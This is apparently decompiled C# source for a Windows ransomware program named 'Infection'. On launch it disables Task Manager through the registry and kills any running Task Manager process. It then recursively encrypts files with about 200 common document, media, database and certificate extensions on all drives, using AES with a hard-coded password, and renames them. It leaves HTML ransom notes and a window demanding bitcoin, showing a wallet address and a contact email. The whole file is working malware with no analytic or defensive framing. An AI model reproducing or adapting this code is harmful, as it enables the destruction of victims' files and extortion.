using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace infection;

public class MainForm : Form
{
	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private IContainer components;

	private Label label1;

	private Label label2;

	private LinkLabel linkLabel1;

	private Label label3;

	private Label label5;

	private LinkLabel linkLabel2;

	private Button button1;

	private Label label4;

	private Label label6;

	private Label label7;

	private Label label8;

	private Label label9;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint param, string vParam, uint winIni);

	public MainForm()
	{
		Directory.CreateDirectory("C:\\Program Files\\Temp");
		Extract("infection", "C:\\Program Files\\Temp", "Resources", "static.png");
		InitializeComponent();
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		using Stream stream = Assembly.GetCallingAssembly().GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void ChangeWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_ControlBox(false);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 1, 2, 2, 3, 3, 4, 4 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string CreateRandomString(int length, string str)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append(str[random.Next(str.Length)]);
		}
		return stringBuilder.ToString();
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		try
		{
			File.WriteAllBytes(file, bytes2);
			string text = "infection";
			File.Move(file, file + "." + text);
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[204]
			{
				".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg", ".png",
				".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
				".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp",
				".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass",
				".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb",
				".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map",
				".wmo", ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
				".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx",
				".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00",
				".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge",
				".kdb", ".db0", ".dba", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod",
				".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik",
				".epk", ".rgss3a", ".pak", ".big", "wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u",
				".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".pem",
				".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
				".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2",
				".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr",
				".indd", ".ai", ".eps", ".pdf", ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd",
				".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk",
				".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc",
				".odm", ".odp", ".ods", ".odt"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (!directories[j].Contains("Windows") && !directories[j].Contains("Program Files") && !directories[j].Contains("Program Files (x86)"))
				{
					encryptDirectory(directories[j], password);
					messageCreator(directories[j]);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void startAction()
	{
		Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		if (Process.GetProcessesByName("taskmgr").Length == 1)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd.exe",
				WindowStyle = ProcessWindowStyle.Hidden,
				Arguments = "/k taskkill /f /im taskmgr.exe && exit"
			});
		}
		string password = "Infection_BABY";
		string text = "\\Desktop\\test";
		string text2 = userDir + userName + text;
		string path = "C:\\Program Files\\Temp\\static.png";
		ChangeWallpaper(path);
		string[] logicalDrives = Directory.GetLogicalDrives();
		foreach (string text3 in logicalDrives)
		{
			if (text3 == "C:\\")
			{
				encryptDirectory(text2, password);
				messageCreator(text2);
			}
			else
			{
				encryptDirectory(text3, password);
			}
			messageCreator(text3);
		}
		password = null;
	}

	public void messageCreator(string path)
	{
		string[] contents = new string[2] { "<html><body>Files has been encrypted with one of Infection Tools", "Send me some bitcoins or say goodbye to your files...</body></html>" };
		try
		{
			File.WriteAllLines(path + "\\CITESTE.html", contents);
		}
		catch (Exception)
		{
		}
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Nu merge asa sefule", "Infection Netowrk", (MessageBoxButtons)0, (MessageBoxIcon)64);
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Expected O, but got Unknown
		//IL_0153: Unknown result type (might be due to invalid IL or missing references)
		//IL_015d: Expected O, but got Unknown
		//IL_01ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f7: Expected O, but got Unknown
		//IL_027c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0286: Expected O, but got Unknown
		//IL_02fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0304: Expected O, but got Unknown
		//IL_037a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0384: Expected O, but got Unknown
		//IL_0486: Unknown result type (might be due to invalid IL or missing references)
		//IL_0490: Expected O, but got Unknown
		//IL_0506: Unknown result type (might be due to invalid IL or missing references)
		//IL_0510: Expected O, but got Unknown
		//IL_0587: Unknown result type (might be due to invalid IL or missing references)
		//IL_0591: Expected O, but got Unknown
		//IL_0608: Unknown result type (might be due to invalid IL or missing references)
		//IL_0612: Expected O, but got Unknown
		//IL_068c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0696: Expected O, but got Unknown
		//IL_07fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0804: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		label1 = new Label();
		label2 = new Label();
		linkLabel1 = new LinkLabel();
		label3 = new Label();
		label5 = new Label();
		linkLabel2 = new LinkLabel();
		button1 = new Button();
		label4 = new Label();
		label6 = new Label();
		label7 = new Label();
		label8 = new Label();
		label9 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial Narrow", 12f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(295, 250));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(97, 20));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Infection#6389");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Arial Narrow", 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(147, 38));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(245, 25));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Foloseste si tu anti-virus =)");
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_Font(new Font("Arial Narrow", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)linkLabel1).set_Location(new Point(70, 224));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(172, 16));
		((Control)linkLabel1).set_TabIndex(2);
		linkLabel1.set_TabStop(true);
		((Control)linkLabel1).set_Text("https://discord.gg/4QhaCjH6hG");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Arial Narrow", 11.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(12, 221));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(52, 20));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("SV DIS:");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Arial Narrow", 11.25f, (FontStyle)3));
		((Control)label5).set_Location(new Point(13, 252));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(61, 20));
		((Control)label5).set_TabIndex(5);
		((Control)label5).set_Text("GITHUB:");
		((Control)linkLabel2).set_AutoSize(true);
		((Control)linkLabel2).set_Font(new Font("Arial Narrow", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)linkLabel2).set_Location(new Point(76, 252));
		((Control)linkLabel2).set_Name("linkLabel2");
		((Control)linkLabel2).set_Size(new Size(164, 16));
		((Control)linkLabel2).set_TabIndex(6);
		linkLabel2.set_TabStop(true);
		((Control)linkLabel2).set_Text("https://github.com/1Dragos12");
		((Control)button1).set_Location(new Point(308, 224));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(7);
		((Control)button1).set_Text("QUIT");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Arial Narrow", 18f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(68, 9));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(247, 29));
		((Control)label4).set_TabIndex(8);
		((Control)label4).set_Text("Ahh! Iar te-am virusat =))");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Arial Narrow", 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_Location(new Point(57, 63));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(240, 25));
		((Control)label6).set_TabIndex(9);
		((Control)label6).set_Text("Security Is Just An Illusion");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Arial Narrow", 12f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_Location(new Point(12, 109));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(371, 20));
		((Control)label7).set_TabIndex(10);
		((Control)label7).set_Text("Send 10000 btc to 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Arial Narrow", 14.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_Location(new Point(13, 141));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(389, 23));
		((Control)label8).set_TabIndex(11);
		((Control)label8).set_Text("After that send a screenshot of the transaction to: ");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Font(new Font("Arial Narrow", 14.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_Location(new Point(13, 164));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(225, 23));
		((Control)label9).set_TabIndex(12);
		((Control)label9).set_Text("tutorialegratuite@gmail.com");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(404, 283));
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)linkLabel2);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)linkLabel1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("MainForm");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Infection Network ");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
